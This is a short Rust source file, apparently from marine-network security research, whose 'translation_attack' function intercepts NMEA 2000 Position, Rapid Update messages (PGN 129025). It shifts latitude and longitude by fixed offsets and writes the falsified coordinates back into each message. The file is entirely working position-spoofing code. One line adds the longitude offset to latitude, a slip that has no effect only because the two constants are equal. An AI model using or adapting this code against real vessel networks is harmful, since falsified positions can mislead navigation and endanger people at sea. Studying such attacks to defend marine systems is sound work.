use crate::NMEAMsg;
static LAT_DIFF: i32 = 250000000;
static LON_DIFF: i32 = 250000000;

//only here temp. will be deleted after - for debugging
extern "C" {

    // Prints a char array as a string. Used for debugging purposes.
    #[link_name = "PrintStr"]
    pub fn PrintStr(input: *const u8, length: i32);

    // Prints an integer. Used for debugging purposes.
    #[link_name = "PrintInt32"]
    pub fn PrintInt32(input: i32, hex: i32);
}

/// Modifies a Position, Rapid Update message
///
/// For PGN 129025
/// Translate the current position by adding LAT_DIFF to latitude, and LON_DIFF to longitude.
pub fn _129025(mut msg: NMEAMsg) -> NMEAMsg{

    // Latitude
    let mut lat_arr: [u8; 4] = [0; 4]; 
    lat_arr.copy_from_slice(&msg.data[0..4]);   
    let lat: i32 = i32::from_le_bytes(lat_arr); 

    // Longitude
    let mut lon_arr: [u8; 4] = [0; 4]; 
    lon_arr.copy_from_slice(&msg.data[4..8]);
    let lon: i32 = i32::from_le_bytes(lon_arr);  

    // Modify the coordinates
    let fake_lat = lat + LON_DIFF;    
    let fake_lon = lon + LON_DIFF;

    // put fake data into messages
    let lat_bytes: [u8; 4] = fake_lat.to_le_bytes();
    msg.data[0..4].copy_from_slice(&lat_bytes);

    let lon_bytes: [u8; 4] = fake_lon.to_le_bytes();
    msg.data[4..8].copy_from_slice(&lon_bytes);

    return msg;
}


/// Modifies a message if it contains positional data
pub fn translation_attack(msg: NMEAMsg) -> NMEAMsg{

    let modified_msg;

    modified_msg = match msg.pgn {
        129025 =>  _129025(msg),
        _ => msg,
    };

    return modified_msg;
}


